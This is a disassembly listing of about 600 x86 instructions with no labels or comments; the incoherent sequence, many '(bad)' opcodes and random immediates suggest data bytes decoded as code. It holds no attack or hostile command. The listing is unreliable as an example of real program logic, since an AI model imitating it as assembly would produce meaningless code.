  489614:	fimul  WORD PTR [esi+0x2f]
  489617:	pop    ds
  489618:	xchg   DWORD PTR [ecx-0x48e294f2],edx
  48961e:	push   edx
  489620:	add    BYTE PTR [edi],al
  489622:	daa    
  489623:	push   edi
  489624:	inc    esp
  489625:	inc    DWORD PTR [ebx-0x75]
  489628:	and    eax,0x46455c87
  48962d:	cmp    al,BYTE PTR [eax+0x28]
  489630:	dec    esi
  489631:	add    ch,BYTE PTR [edi+0x74]
  489634:	mov    al,0x4e
  489636:	sub    al,0xf7
  489638:	lahf   
  489639:	stos   DWORD PTR es:[edi],eax
  48963a:	adc    BYTE PTR [edx],dl
  48963c:	sbb    BYTE PTR [edi-0x53e218b9],al
  489642:	mov    gs,WORD PTR [ebp+0x2f]
  489645:	test   DWORD PTR [edi+0x43],0x6b3c16f0
  48964c:	dec    edi
  48964d:	cmp    esp,DWORD PTR [edi+0x76b5a231]
  489653:	and    eax,0xc3e25743
  489658:	ret    0xe7e2
  48965b:	addr16 pop eax
  48965d:	mov    al,ds:0x7f9f00c1
  489662:	inc    esi
  489663:	inc    eax
  489664:	push   0x8670394
  489669:	dec    esp
  48966a:	lods   al,BYTE PTR ds:[esi]
  48966b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48966c:	(bad)  
  48966d:	push   edi
  48966e:	shr    dl,0x84
  489671:	mov    al,0x9f
  489673:	xor    DWORD PTR [ebx+edx*1+0xf67e7eb],ecx
  48967a:	test   cl,bl
  48967c:	sub    ch,BYTE PTR [ebx]
  48967e:	addr16 lahf 
  489680:	aaa    
  489681:	push   ecx
  489682:	xadd   BYTE PTR [edx],cl
  489685:	das    
  489686:	mov    ebx,0xe14a2988
  48968b:	jnp    0x4896ac
  48968d:	aaa    
  48968e:	jne    0x4896b9
  489690:	inc    eax
  489691:	mov    ds:0x2062ffbf,eax
  489696:	add    dh,BYTE PTR [ecx+0x44]
  489699:	mov    bh,0x37
  48969b:	inc    esp
  48969c:	lods   al,BYTE PTR ds:[esi]
  48969d:	aad    0x41
  48969f:	ja     0x489690
  4896a1:	push   cs
  4896a2:	imul   esi,DWORD PTR [edi-0x5568205b],0xffffffd6
  4896a9:	push   0x5c97572c
  4896ae:	push   ss
  4896af:	push   cs
  4896b0:	sbb    DWORD PTR [ecx+0x31],eax
  4896b3:	mov    edi,0x4c88c815
  4896b8:	cmp    edi,esp
  4896ba:	pushf  
  4896bb:	fiadd  DWORD PTR [ebx+eiz*2]
  4896be:	ja     0x4896ef
  4896c0:	pop    eax
  4896c1:	adc    DWORD PTR [esi+0x77324762],esp
  4896c7:	and    al,0x36
  4896c9:	or     ch,BYTE PTR [ebx-0x60b7d491]
  4896cf:	pop    eax
  4896d0:	mov    edi,fs
  4896d2:	add    ebx,ebx
  4896d4:	sbb    BYTE PTR [ebx],0xc6
  4896d7:	push   es
  4896d8:	addr16 pop es
  4896da:	(bad)  
  4896db:	or     eax,0x27ff18ad
  4896e0:	daa    
  4896e1:	push   ss
  4896e2:	lds    esi,FWORD PTR [ecx-0x2f40a865]
  4896e8:	jbe    0x4896bb
  4896ea:	pop    eax
  4896eb:	scas   eax,DWORD PTR es:[edi]
  4896ec:	out    0x61,eax
  4896ee:	loope  0x4896aa
  4896f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4896f1:	push   edi
  4896f2:	aaa    
  4896f3:	(bad)  
  4896f4:	mov    cl,BYTE PTR [eax-0x3ba8e8bc]
  4896fa:	jo     0x489754
  4896fc:	mov    edi,?
  4896fe:	retf   0xf19f
  489701:	test   DWORD PTR [edi+0x63],eax
  489704:	fild   WORD PTR [edi-0x3e]
  489707:	mov    bh,0x16
  489709:	mov    ch,0x37
  48970b:	aas    
  48970c:	add    al,0x1f
  48970e:	sbb    bl,BYTE PTR [ebp-0x29]
  489711:	pop    edi
  489712:	pinsrw mm2,WORD PTR ds:0x33cf484a,0xd2
  48971a:	lea    esi,[esi]
  48971c:	pushf  
  48971d:	cmp    BYTE PTR [bx-0x4a],dh
  489721:	jo     0x489733
  489723:	dec    eax
  489724:	adc    eax,0x4252767
  489729:	mov    ds:0xb3618718,al
  48972e:	push   esi
  48972f:	jb     0x48971f
  489731:	inc    ebx
  489732:	imul   ecx,DWORD PTR [eax+0x4],0xffffffd0
  489736:	inc    esi
  489737:	out    0xb7,eax
  489739:	push   esi
  48973a:	adc    DWORD PTR [ebx+0x48d3df4a],ecx
  489740:	xchg   DWORD PTR [ecx+0x32ee1718],esi
  489746:	sub    ah,BYTE PTR [ecx+ebx*1+0x77f34543]
  48974d:	mov    ebp,0x472c0dd6
  489752:	mov    edi,0x60ce0a35
  489757:	and    DWORD PTR [edi],edi
  489759:	mov    ds:0x1c95833f,al
  48975e:	in     al,dx
  48975f:	xor    al,0x5f
  489761:	xor    al,0xea
  489763:	xchg   ebx,eax
  489764:	mov    DWORD PTR [ebp+0x33bf1f00],ebp
  48976a:	and    eax,0x87086e8c
  48976f:	inc    esi
  489770:	add    esp,DWORD PTR [eax+0x5e6f4741]
  489776:	lods   eax,DWORD PTR ds:[esi]
  489777:	push   es
  489778:	xchg   ebp,eax
  489779:	lahf   
  48977a:	cli    
  48977b:	(bad)  
  48977c:	cmp    BYTE PTR [ecx],cl
  48977e:	dec    edx
  48977f:	lds    ecx,FWORD PTR [eax+0x57]
  489782:	dec    eax
  489783:	mov    ebp,0x3fff8b05
  489788:	dec    ebx
  489789:	push   ss
  48978a:	test   BYTE PTR [esi+edx*8],dl
  48978d:	outs   dx,DWORD PTR ds:[esi]
  48978e:	not    DWORD PTR [esi]
  489790:	fsubr  QWORD PTR [edx]
  489792:	xor    dh,BYTE PTR [edi]
  489794:	push   esi
  489795:	fistp  WORD PTR [ecx]
  489797:	loop   0x48979d
  489799:	icebp  
  48979a:	div    DWORD PTR [edi+0x36]
  48979d:	(bad)  
  48979e:	(bad)  
  48979f:	cs sub eax,0x55a35f4f
  4897a5:	lods   al,BYTE PTR ds:[esi]
  4897a6:	or     al,BYTE PTR [edi+0x57]
  4897a9:	addr16 mov al,0x68
  4897ac:	fwait
  4897ad:	test   bl,cl
  4897af:	iret   
  4897b0:	aad    0x68
  4897b2:	pop    eax
  4897b3:	stos   BYTE PTR es:[edi],al
  4897b4:	adc    bh,BYTE PTR [ecx]
  4897b6:	aas    
  4897b7:	inc    esi
  4897b8:	popf   
  4897b9:	adc    al,0x2e
  4897bb:	mov    DWORD PTR [ebx+0x4f],esp
  4897be:	leave  
  4897bf:	jno    0x48978b
  4897c1:	or     al,BYTE PTR [edi+0x22790a31]
  4897c7:	or     BYTE PTR [edi],cl
  4897c9:	inc    edx
  4897ca:	add    BYTE PTR [eax+edx*2-0x50],al
  4897ce:	adc    esp,0x4234bf8f
  4897d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4897d5:	and    bh,BYTE PTR [edi-0x6aa732cb]
  4897db:	push   esi
  4897dc:	daa    
  4897dd:	mov    bh,0x17
  4897df:	add    ebp,0xff16617a
  4897e5:	and    eax,0x42
  4897e8:	and    eax,0x5b0fb617
  4897ed:	jo     0x4897fb
  4897ef:	and    al,0x43
  4897f1:	iret   
  4897f2:	scas   al,BYTE PTR es:[edi]
  4897f3:	stos   BYTE PTR es:[edi],al
  4897f4:	inc    edx
  4897f5:	add    eax,0x31a60789
  4897fa:	inc    ebx
  4897fb:	inc    ebx
  4897fc:	jmp    0xd201:0x384f2f58
  489803:	mov    BYTE PTR [ecx],ch
  489805:	dec    edi
  489806:	test   DWORD PTR [ebx],esp
  489808:	and    ah,bl
  48980a:	out    0xcf,eax
  48980c:	inc    edx
  48980d:	add    ah,BYTE PTR [ecx+0x45]
  489810:	(bad)  
  489812:	out    0xff,eax
  489814:	pushw  0xff87
  489817:	xchg   ecx,eax
  489818:	mov    ds:0x24ae22df,eax
  48981d:	mov    al,0x77
  48981f:	inc    ebp
  489820:	pop    es
  489821:	test   BYTE PTR [edx],dl
  489823:	adc    eax,0x4d3097a7
  489828:	pop    esp
  489829:	jp     0x489822
  48982b:	out    0x33,eax
  48982d:	dec    edi
  48982e:	dec    ebx
  48982f:	xor    cl,ah
  489831:	bound  ecx,QWORD PTR [edi]
  489833:	outs   dx,DWORD PTR ds:[esi]
  489834:	jae    0x489820
  489836:	or     BYTE PTR [ebp-0x40],dl
  489839:	daa    
  48983a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48983b:	push   ebx
  48983c:	js     0x4898a2
  48983e:	(bad)  
  48983f:	scas   eax,DWORD PTR es:[edi]
  489840:	cs dec edi
  489842:	lods   eax,DWORD PTR ds:[esi]
  489843:	mov    dl,BYTE PTR ds:0xce75fd7
  489849:	cwde   
  48984a:	hlt    
  48984b:	test   BYTE PTR [edi],dl
  48984d:	das    
  48984e:	adc    edx,ebp
  489850:	adc    dl,BYTE PTR [esi]
  489852:	pop    es
  489853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489855:	mov    ah,0xe0
  489857:	xchg   edx,eax
  489858:	inc    edi
  489859:	lods   eax,DWORD PTR ds:[esi]
  48985a:	sbb    BYTE PTR [ecx],cl
  48985c:	sub    al,0x4f
  48985e:	outs   dx,DWORD PTR ds:[esi]
  48985f:	lods   al,BYTE PTR ds:[esi]
  489860:	push   0x61
  489862:	rol    BYTE PTR [edi+0x43],cl
  489865:	das    
  489866:	loope  0x48981d
  489868:	or     BYTE PTR [ebp-0x41],al
  48986b:	imul   edx,DWORD PTR [edx-0x69],0xffffff90
  48986f:	sub    ecx,DWORD PTR [edi]
  489871:	ss xchg esi,eax
  489873:	or     BYTE PTR [ecx+0x5bef1c35],ch
  489879:	scas   eax,DWORD PTR es:[edi]
  48987a:	stos   DWORD PTR es:[edi],eax
  48987b:	adc    BYTE PTR [ebx],bh
  48987d:	mov    al,0x1f
  48987f:	xlat   BYTE PTR ds:[ebx]
  489880:	adc    eax,0x534bf43a
  489885:	cmp    BYTE PTR [edi-0x4f],bl
  489888:	inc    edx
  489889:	shr    BYTE PTR [eax],0xf
  48988c:	sti    
  48988d:	and    BYTE PTR [ecx],al
  48988f:	inc    esi
  489890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489891:	dec    edi
  489892:	mov    DWORD PTR [ebp-0x55],0x381f374a
  489899:	pop    es
  48989a:	pop    ss
  48989b:	inc    ebx
  48989c:	scas   al,BYTE PTR es:[edi]
  48989d:	loopne 0x48990a
  48989f:	daa    
  4898a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4898a1:	inc    ebx
  4898a2:	call   0x2f6f:0x3790b09e
  4898a9:	es xchg ebp,eax
  4898ab:	imul   edx,edx,0x843742bf
  4898b1:	add    ebp,0x0
  4898b4:	scas   eax,DWORD PTR es:[edi]
  4898b5:	mov    ebx,0xdd66a442
  4898ba:	out    0x39,eax
  4898bc:	ja     0x4898bd
  4898be:	lods   al,BYTE PTR ds:[esi]
  4898bf:	adc    DWORD PTR [eax],0xffffffd0
  4898c2:	lahf   
  4898c3:	sbb    ecx,DWORD PTR ss:[ebx+0x1767c422]
  4898ca:	sbb    eax,esi
  4898cc:	xchg   edx,eax
  4898cd:	sub    bh,dh
  4898cf:	aaa    
  4898d0:	mov    al,BYTE PTR [ecx-0x3f]
  4898d3:	cdq    
  4898d4:	xchg   DWORD PTR [edx],esi
  4898d6:	aas    
  4898d7:	daa    
  4898d8:	pusha  
  4898d9:	and    DWORD PTR [esi-0x53],esp
  4898dc:	pop    edi
  4898dd:	mov    bh,0xb7
  4898df:	push   edx
  4898e0:	dec    eax
  4898e1:	imul   esi,DWORD PTR [eax],0x72a4374f
  4898e7:	sbb    eax,0x4541275a
  4898ec:	imul   ebp,DWORD PTR [ecx+0x37bfd41b],0x150d4646
  4898f6:	pop    ds
  4898f7:	inc    ecx
  4898f8:	mov    edi,0xae499175
  4898fd:	xlat   BYTE PTR ds:[ebx]
  4898fe:	xor    BYTE PTR [eax],bh
  489900:	add    ah,BYTE PTR [eax]
  489902:	(bad)  
  489903:	sbb    ch,BYTE PTR [esi-0x4710f075]
  489909:	adc    al,0x50
  48990b:	mov    edx,0xd0e27737
  489910:	mov    al,ds:0xb7e79560
  489915:	test   BYTE PTR [ebp+0x2c],dl
  489918:	lods   al,BYTE PTR ds:[esi]
  489919:	mov    bh,0x17
  48991b:	and    eax,0x9f74eb6e
  489920:	cli    
  489921:	pop    ss
  489922:	es inc ebx
  489924:	fld    TBYTE PTR [ebp+0x3f]
  489927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489928:	inc    esp
  489929:	outs   dx,BYTE PTR fs:[esi]
  48992b:	pop    esp
  48992c:	aaa    
  48992d:	xchg   edi,eax
  48992e:	xor    edi,esi
  489930:	xor    al,ch
  489932:	or     BYTE PTR ds:0x56574729,dl
  489938:	xchg   esp,eax
  489939:	test   al,0x75
  48993b:	inc    ebp
  48993c:	out    dx,eax
  48993d:	daa    
  48993e:	or     BYTE PTR ds:0x97f7375a,cl
  489944:	ret    
  489945:	push   ebp
  489946:	mov    eax,ds:0xe7cbbe77
  48994b:	cmp    DWORD PTR [edi+0x1f263b01],edi
  489951:	xor    DWORD PTR [eax],eax
  489953:	ss mov edi,0x27a7b8d2
  489959:	jecxz  0x48997e
  48995b:	bound  edx,QWORD PTR [edi-0x108b596f]
  489961:	aaa    
  489962:	out    dx,eax
  489963:	lods   al,BYTE PTR ds:[esi]
  489964:	mov    al,0xe
  489966:	inc    esi
  489967:	scas   eax,DWORD PTR es:[edi]
  489968:	mov    edi,0x615b633d
  48996d:	addr16 jmp 0x4899ab
  489970:	lds    esp,FWORD PTR ds:0x77d2de2c
  489976:	mov    dl,0xaf
  489978:	ret    0x1d6a
  48997b:	sub    dl,bh
  48997d:	dec    edi
  48997e:	dec    eax
  48997f:	inc    edi
  489980:	sbb    ch,dl
  489982:	scas   eax,DWORD PTR es:[edi]
  489983:	ret    
  489984:	(bad)  
  489985:	mov    eax,ds:0xff8fe971
  48998a:	xchg   edi,eax
  48998b:	stos   BYTE PTR es:[edi],al
  48998c:	test   BYTE PTR [ecx],dl
  48998e:	xchg   ecx,eax
  48998f:	outs   dx,DWORD PTR ds:[esi]
  489990:	arpl   WORD PTR [ebx],ax
  489992:	jns    0x48992f
  489994:	fdivr  st(3),st
  489996:	outs   dx,DWORD PTR ds:[esi]
  489997:	ss xor eax,0x53576d05
  48999d:	pop    ss
  48999e:	xor    DWORD PTR [edi],ebx
  4899a0:	mov    cl,0x2
  4899a2:	(bad)  
  4899a3:	sub    dh,BYTE PTR [edi-0x49bc7719]
  4899a9:	or     al,BYTE PTR [edi+0x5c8c8e47]
  4899af:	test   eax,0x45472744
  4899b4:	inc    ebp
  4899b5:	jmp    0x6a13:0x308c8523
  4899bc:	xor    BYTE PTR [eax-0x4bf858de],dl
  4899c2:	push   0xffffffad
  4899c4:	(bad)  
  4899c5:	xchg   edi,eax
  4899c6:	das    
  4899c7:	(bad)  
  4899c8:	push   esp
  4899c9:	adc    bl,al
  4899cb:	xlat   BYTE PTR ds:[ebx]
  4899cc:	jg     0x4899fe
  4899ce:	xchg   ecx,eax
  4899cf:	stos   BYTE PTR es:[edi],al
  4899d0:	lea    ebx,[ebp-0x29]
  4899d3:	out    dx,eax
  4899d4:	push   edx
  4899d5:	push   ebx
  4899d6:	or     eax,0x310befb8
  4899db:	or     eax,0x27a1e4ad
  4899e0:	cmp    BYTE PTR [eax],al
  4899e2:	inc    esi
  4899e3:	test   bl,dl
  4899e5:	call   0xdadd:0x2f449f18
  4899ec:	aaa    
  4899ed:	push   esi
  4899ee:	adc    ebx,DWORD PTR [edi-0x4ae7bdfd]
  4899f4:	loopne 0x489978
  4899f6:	mov    bh,0x31
  4899f8:	jae    0x489989
  4899fa:	sub    ebx,DWORD PTR [edx+ecx*1]
  4899fd:	fcmovnbe st,st(7)
  4899ff:	pop    ds
  489a00:	out    0xde,eax
  489a02:	lds    ecx,FWORD PTR [edx]
  489a04:	test   eax,0x45331777
  489a09:	aam    0xda
  489a0b:	sub    dl,BYTE PTR [edi]
  489a0d:	xlat   BYTE PTR ds:[ebx]
  489a0e:	out    dx,eax
  489a0f:	xor    DWORD PTR [edx-0x20604a7c],ebp
  489a15:	pop    edx
  489a16:	add    esi,edx
  489a18:	lock scas eax,DWORD PTR es:[edi]
  489a1a:	ja     0x48999f
  489a1c:	dec    eax
  489a1d:	outs   dx,DWORD PTR ds:[esi]
  489a1e:	pusha  
  489a1f:	js     0x489a40
  489a21:	scas   eax,DWORD PTR es:[edi]
  489a22:	xor    DWORD PTR [edi+0x2ba64230],edx
  489a28:	fwait
  489a29:	mov    bl,0x2a
  489a2b:	jmp    0xd422f750
  489a30:	call   FWORD PTR [edi-0x4b0f7dc8]
  489a36:	(bad)  
  489a37:	fbstp  TBYTE PTR [ebx]
  489a39:	mov    esp,ecx
  489a3b:	fsubr  QWORD PTR [edx]
  489a3d:	out    0x6b,eax
  489a3f:	inc    esi
  489a40:	pop    edi
  489a41:	adc    DWORD PTR [edx-0x3060aa57],ecx
  489a47:	mov    ds:0x5374db60,eax
  489a4c:	aaa    
  489a4d:	push   edi
  489a4e:	mov    bh,0x8c
  489a50:	push   cs
  489a51:	lea    eax,[ebx]
  489a53:	pop    edi
  489a54:	aas    
  489a55:	adc    BYTE PTR [ebp-0x6928e3c4],0x39
  489a5c:	popa   
  489a5d:	adc    BYTE PTR [ebx+eax*1],bl
  489a60:	pop    ds
  489a61:	ss out 0x14,eax
  489a64:	jbe    0x489a02
  489a66:	push   ss
  489a67:	outs   dx,DWORD PTR ds:[esi]
  489a68:	out    dx,al
  489a69:	xor    esi,DWORD PTR [eax+0x336d360a]
  489a6f:	repz mov bh,0x52
  489a72:	adc    DWORD PTR [ecx],0x5b
  489a75:	pop    es
  489a76:	iret   
  489a77:	xor    bl,BYTE PTR [eax]
  489a79:	sbb    ecx,DWORD PTR [esi]
  489a7b:	fcomp  DWORD PTR [esi-0x5b38c831]
  489a81:	xchg   BYTE PTR [ebx],dh
  489a83:	ss pop edi
  489a85:	repnz outs dx,DWORD PTR ds:[esi]
  489a87:	adc    BYTE PTR [edx],ch
  489a89:	push   0xc94fb73c
  489a8e:	adc    eax,0xdfaa8c5c
  489a93:	pop    es
  489a94:	xor    eax,0x1d8a3566
  489a99:	inc    ebx
  489a9a:	iret   
  489a9b:	dec    ebx
  489a9c:	aaa    
  489a9d:	push   0xa7b4f1d8
  489aa2:	scas   eax,DWORD PTR es:[edi]
  489aa3:	iret   
  489aa4:	lods   eax,DWORD PTR ds:[esi]
  489aa5:	sar    DWORD PTR [edx+0x46463735],1
  489aab:	ins    DWORD PTR es:[edi],dx
  489aac:	and    al,ah
  489aae:	pop    ds
  489aaf:	xlat   BYTE PTR ds:[ebx]
  489ab0:	push   ebx
  489ab1:	jmp    0xbf6fa8ea
  489ab6:	arpl   bp,dx
  489ab8:	ficom  DWORD PTR [esi]
  489aba:	sub    DWORD PTR [edi-0x9],0xffffff8c
  489abe:	pop    ebx
  489abf:	xchg   ebx,eax
  489ac0:	stos   DWORD PTR es:[edi],eax
  489ac1:	lahf   
  489ac2:	xor    eax,0x2b044157
  489ac7:	adc    DWORD PTR [edi],eax
  489ac9:	xlat   BYTE PTR ds:[ebx]
  489aca:	cdq    
  489acb:	in     al,0x1a
  489acd:	sbb    DWORD PTR [edi],0xea043345
  489ad3:	nop
  489ad4:	xor    BYTE PTR [edi+0x249ad085],cl
  489ada:	(bad)  
  489adb:	outs   dx,DWORD PTR ds:[esi]
  489adc:	out    dx,eax
  489add:	adc    dl,BYTE PTR [ecx]
  489adf:	je     0x489b1a
  489ae1:	mov    edi,0x2903bb42
  489ae6:	in     al,0x5a
  489ae8:	push   es
  489ae9:	cmp    cl,ah
  489aeb:	push   0xc
  489aed:	cs mov edi,0x58133167
  489af3:	ret    
  489af4:	dec    edx
  489af5:	lahf   
  489af6:	lahf   
  489af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489af8:	push   esi
  489af9:	nop
  489afa:	lods   eax,DWORD PTR ds:[esi]
  489afb:	pop    ds
  489afc:	daa    
  489afd:	pop    es
  489afe:	ja     0x489b20
  489b00:	pop    ss
  489b01:	xor    DWORD PTR [edx+0x1f],eax
  489b04:	xor    BYTE PTR [edx-0x37],cl
  489b07:	int    0x4a
  489b09:	fild   WORD PTR [ebx+0x56]
  489b0c:	or     eax,0x471700b7
  489b11:	call   FWORD PTR [eax]
  489b13:	imul   edx,esi,0x2a
  489b16:	mov    bh,0x27
  489b18:	adc    esp,0xffffffa9
  489b1b:	mov    DWORD PTR [edi+0x26867738],eax
  489b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489b22:	sbb    BYTE PTR [ecx+0x6f],0x37
  489b26:	pop    ss
  489b27:	pushf  
  489b28:	dec    edx
  489b29:	dec    ebp
  489b2a:	lahf   
  489b2b:	xchg   DWORD PTR [eax],esi
  489b2d:	adc    ah,cl
  489b2f:	pop    edx
  489b30:	leave  
  489b31:	add    BYTE PTR [esi],dh
  489b33:	xchg   DWORD PTR [edx],ecx
  489b35:	(bad)
  489b3a:	(bad)  
  489b3b:	sub    cl,BYTE PTR [esi-0x53]
  489b3e:	(bad)  
  489b3f:	in     al,0x58
  489b41:	mov    eax,ebx
  489b43:	aas    
  489b44:	jbe    0x489b8a
  489b46:	xor    DWORD PTR [esi-0x4b],edx
  489b49:	xchg   esp,eax
  489b4a:	das    
  489b4b:	dec    edi
  489b4c:	mov    ds:0x7f6b06b5,eax
  489b51:	out    dx,eax
  489b52:	push   ebx
  489b53:	dec    edi
  489b54:	pop    eax
  489b55:	pop    ebx
  489b56:	das    
  489b57:	sti    
  489b58:	mov    esi,0x97aa5662
  489b5d:	xchg   edi,eax
  489b5e:	xor    DWORD PTR [eax],eax
  489b60:	xor    esp,DWORD PTR [ebx-0x58b5bd27]
  489b66:	inc    eax
  489b67:	dec    esi
  489b68:	mov    eax,DWORD PTR [ecx-0x31]
  489b6b:	sbb    ebx,edx
  489b6d:	cdq    
  489b6e:	or     DWORD PTR [ecx+0x6384427],edi
  489b74:	push   edi
  489b75:	push   es
  489b76:	sub    edi,DWORD PTR [ecx]
  489b78:	in     al,0x44
  489b7a:	inc    ebx
  489b7b:	add    ah,BYTE PTR [edx+0x35]
  489b7e:	or     bh,dl
  489b80:	push   edi
  489b81:	cmp    DWORD PTR [edi+0x4d],ebx
  489b84:	sbb    eax,0x3f976224
  489b89:	push   edi
  489b8a:	push   0x239fd5bd
  489b8f:	push   DWORD PTR [eax]
  489b91:	mov    eax,ds:0x4624dab5
  489b96:	idiv   edi
  489b98:	and    eax,0xc65ad6c3
  489b9d:	push   edi
  489b9e:	inc    ebp
  489b9f:	xor    dh,dl
  489ba1:	add    eax,0x688b3762
  489ba6:	shr    DWORD PTR [eax+0x164fcf9f],0x95
  489bad:	push   esi
  489bae:	add    DWORD PTR [edi+0x6ae42c37],edi
  489bb4:	cmp    ebx,DWORD PTR [edi+0xb423987]
  489bba:	mov    DWORD PTR [edi+0x7f],ebp
  489bbd:	dec    edi
  489bbe:	je     0x489b84
  489bc0:	scas   al,BYTE PTR es:[edi]
  489bc1:	bound  esi,QWORD PTR [edi]
  489bc3:	xor    edx,DWORD PTR [edi-0x2957efbb]
  489bc9:	cmp    cl,bh
  489bcb:	dec    edi
  489bcc:	pusha  
  489bcd:	xor    edx,DWORD PTR [esi-0x6d]
  489bd0:	fbld   TBYTE PTR [ebx]
  489bd2:	xor    BYTE PTR [ebp+0x12],0xab
  489bd6:	ja     0x489b67
  489bd8:	cpuid  
  489bda:	pop    ebx
  489bdb:	bt     DWORD PTR [edi+0x62c11067],ebp
  489be2:	push   esi
  489be3:	scas   eax,DWORD PTR es:[edi]
  489be4:	pop    ds
  489be5:	xchg   ebp,eax
  489be6:	mov    BYTE PTR [ebp+0x517a3a7],al
  489bec:	dec    esi
  489bed:	dec    ecx
  489bee:	test   BYTE PTR ds:[ebx+ebp*4+0x2f],0xcd
  489bf4:	pop    edx
  489bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489bf6:	push   esi
  489bf7:	scas   eax,DWORD PTR es:[edi]
  489bf8:	scas   eax,DWORD PTR es:[edi]
  489bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489bfa:	inc    edx
  489bfb:	loopne 0x489c0f
  489bfd:	mov    es,WORD PTR [edi]
  489bff:	pushf  
  489c00:	fidiv  DWORD PTR [ebp-0x103098de]
  489c06:	dec    ecx
  489c07:	push   edi
  489c08:	aaa    
  489c09:	inc    edx
  489c0a:	inc    edi
  489c0b:	aaa    
  489c0c:	js     0x489c65
  489c0e:	mov    bl,0x95
  489c10:	sub    edi,edi
  489c12:	xor    al,0xa3
  489c14:	popf   
  489c15:	jo     0x489bb7
  489c17:	popf   
  489c18:	(bad)  
  489c19:	pop    edi
  489c1a:	mov    esi,0x66ac54d6
  489c1f:	not    DWORD PTR [edi]
  489c21:	inc    ebp
  489c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489c23:	sub    DWORD PTR [eax+ebp*1+0x17],esp
  489c27:	inc    ebx
  489c28:	xor    BYTE PTR [edi],dh
  489c2a:	ds mov al,0x9a
  489c2d:	pop    es
  489c2e:	xor    esp,edi
  489c30:	sub    eax,0xb7c612ad
  489c35:	mov    dh,BYTE PTR [ecx+0xfcf55aa]
  489c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489c3c:	adc    esp,DWORD PTR [ebx+0x7772b463]
  489c42:	jo     0x489c14
  489c44:	lods   eax,DWORD PTR ds:[esi]
  489c45:	dec    edx
  489c46:	inc    edi
  489c47:	and    ch,dl
  489c49:	les    edi,FWORD PTR [edx]
  489c4b:	les    ecx,FWORD PTR [edx+0x6175f1f]
  489c51:	(bad)  
  489c52:	test   al,0x14
  489c54:	pop    es
  489c55:	lods   eax,DWORD PTR ds:[esi]
  489c56:	or     ch,BYTE PTR ds:0xbbf1722
  489c5c:	test   esi,eax
  489c5e:	shl    BYTE PTR [ebx-0x22],0xb7
  489c62:	aas    
  489c63:	shl    BYTE PTR [edx-0x80a430],1
  489c69:	lods   al,BYTE PTR ds:[esi]
  489c6a:	sbb    BYTE PTR [eax+0x1d],bl
  489c6d:	inc    edi
  489c6e:	inc    edi
  489c6f:	xchg   BYTE PTR [eax+0x5],bl
  489c72:	outs   dx,DWORD PTR ds:[esi]
  489c73:	add    bh,BYTE PTR [edi-0x65]
  489c76:	push   0xffffffe0
  489c78:	test   BYTE PTR [ebp-0xd],bl
  489c7b:	(bad)  
  489c7c:	daa    
  489c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489c7e:	adc    BYTE PTR [edx+0x26],al
  489c81:	xor    BYTE PTR [edi],dl
  489c83:	test   eax,0x2f469ad6
  489c88:	jae    0x45dae14f
  489c8e:	aaa    
  489c8f:	mov    ch,0xa2
  489c91:	xor    DWORD PTR [edx],ecx
  489c93:	outs   dx,DWORD PTR ds:[esi]
  489c94:	mov    bh,0x6c
  489c96:	call   0x6fe8246d
  489c9b:	inc    esp
  489c9c:	push   edi
  489c9d:	popf   
  489c9e:	and    al,0x2e
  489ca0:	push   es
  489ca1:	addr16 pop es
  489ca3:	popa   
  489ca4:	test   DWORD PTR [edx+0x69],esp
  489ca7:	pop    es
  489ca8:	(bad)  
  489ca9:	aaa    
  489caa:	mov    ch,0x28
  489cac:	(bad)  
  489cad:	aaa    
  489cae:	mov    WORD PTR [eax+0x350fa82e],es
  489cb4:	xchg   DWORD PTR ds:0xa70489a8,ecx
  489cba:	dec    ecx
  489cbb:	or     dh,BYTE PTR [ecx]
  489cbd:	jmp    0x489ca2
  489cbf:	test   DWORD PTR [edx+esi*2+0x11],0x301f8316
  489cc7:	xor    DWORD PTR [eax],eax
  489cc9:	jns    0x489d40
  489ccb:	adc    DWORD PTR [edi+0x35427f36],ecx
  489cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489cd2:	add    eax,0x693f9bd0
  489cd7:	or     al,0x4
  489cd9:	pop    eax
  489cda:	daa    
  489cdb:	xor    bl,al
  489cdd:	icebp  
  489cde:	mov    dh,0xd4
  489ce0:	jmp    FWORD PTR [edi+0xdb5b79b]
  489ce6:	adc    al,0x40
  489ce8:	iret   
  489ce9:	inc    ebx
  489cea:	ja     0x489ca9
  489cec:	push   esp
  489ced:	sub    al,0xba
  489cef:	fist   WORD PTR [edi]
  489cf1:	iret   
  489cf2:	das    
  489cf3:	inc    ebp
  489cf4:	test   DWORD PTR [edx+0xf],ebp
  489cf7:	das    
  489cf8:	inc    esi
  489cf9:	adc    DWORD PTR [ecx],edx
  489cfb:	mov    al,ds:0xd76f0f5a
  489d00:	stos   BYTE PTR es:[edi],al
  489d01:	add    ch,BYTE PTR [ebp-0x61]
  489d04:	aaa    
  489d05:	fild   WORD PTR [ebp+eax*4+0x339fc30c]
  489d0c:	lods   al,BYTE PTR ds:[esi]
  489d0d:	push   edx
  489d0e:	jecxz  0x489d8a
  489d10:	retf   
  489d11:	xor    DWORD PTR [edi-0x29],esp
  489d14:	sbb    al,0x84
  489d16:	aam    0x4e
  489d18:	mov    bh,0x47
  489d1a:	inc    ecx
  489d1b:	add    DWORD PTR [eax-0x600064bf],0x5c2a25e
  489d25:	call   FWORD PTR ss:[edi+0x2b92b0ac]
  489d2c:	xlat   BYTE PTR ds:[ebx]
  489d2d:	xor    eax,0x626edffe
  489d32:	push   ebp
  489d33:	xlat   BYTE PTR ds:[ebx]
  489d34:	lahf   
  489d35:	outs   dx,DWORD PTR ds:[esi]
